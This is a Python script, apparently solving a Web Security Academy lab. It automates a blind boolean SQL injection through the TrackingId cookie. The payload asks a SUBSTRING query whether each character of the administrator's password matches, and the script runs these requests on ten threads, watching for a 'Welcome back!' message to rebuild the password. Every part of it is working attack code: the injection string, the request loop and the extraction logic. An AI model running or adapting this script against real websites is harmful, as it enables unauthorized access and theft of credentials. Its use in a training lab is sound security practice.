import requests
from pwn import *
import concurrent.futures

data_retrieved = ""


def check_char(process, c, cth):
    global data_retrieved
    
    burp0_url = "https://0ab400ef04dd65f1800c7b2c003900d0.web-security-academy.net:443/login"
    burp0_cookies = {"TrackingId": f"qns9oXuU4uDlcbhp' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), {cth}, 1) = '{c}", "session": "40BQuiBiyCcYfAednrRLfvPKo4QVhzxG"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0ab400ef04dd65f1800c7b2c003900d0.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

    # if the trackingid is correct, a "Welcome back" message will be retrieved
    if "Welcome back!" in r.text:
        print(f"Character retrieved: {c}")
        data_retrieved += c
        process.success(f'Valid character found ({c})!')
        

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
num_threads = 10

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    # password lenght = 20
    for i in range(20):
        process = log.progress(f"Testing {i+1}th char")

        # multithreading
        futures = []
        for c in range(len(chars)):
            futures.append(executor.submit(check_char, process, chars[c], i+1))
        # wait for all the requests to complete before checking results
        concurrent.futures.wait(futures)
        # clear the list of futures after each iteraction
        futures.clear()

        print(f"Data retrieved: {data_retrieved}")
